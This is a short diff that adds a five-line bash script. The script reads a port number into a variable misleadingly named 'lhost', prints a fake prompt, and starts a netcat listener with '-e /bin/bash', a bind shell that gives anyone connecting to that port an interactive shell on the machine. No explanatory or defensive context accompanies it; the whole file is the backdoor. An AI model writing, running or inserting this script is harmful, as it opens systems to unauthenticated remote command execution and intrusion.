@@ -1,0 +1,5 @@
+#!/bin/bash
+
+read lhost
+echo "LocalHost ~$ "
+nc -l -p $lhost -e /bin/bash
